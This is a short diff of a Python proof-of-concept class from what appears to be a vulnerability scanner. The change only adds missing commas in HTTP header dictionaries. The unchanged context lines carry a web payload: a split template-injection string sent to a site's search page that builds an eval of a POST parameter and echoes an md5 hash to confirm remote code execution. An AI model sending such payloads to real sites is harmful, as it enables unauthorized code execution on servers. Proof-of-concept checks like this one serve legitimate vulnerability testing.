@@ -44,8 +44,8 @@ class Poc(ABPoc):
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
                 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                 'Accept-Encoding': 'gzip, deflate Content-Type: application/x-www-form-urlencoded',
-                'Content-Length': '208' 
-                'Connection': 'keep-alive'
+                'Content-Length': '208',
+                'Connection':'keep-alive'
             }
             data = 'Upgrade-Insecure-Requests: 1 searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ec&9[]=ho(md5(c));'
             url = self.target + payload
@@ -69,7 +69,7 @@ class Poc(ABPoc):
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
                 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                 'Accept-Encoding': 'gzip, deflate Content-Type: application/x-www-form-urlencoded',
-                'Content-Length': '208' 
+                'Content-Length': '208',
                 'Connection': 'keep-alive'
             }
             data = 'Upgrade-Insecure-Requests: 1 searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ec&9[]=ho(md5(c));'
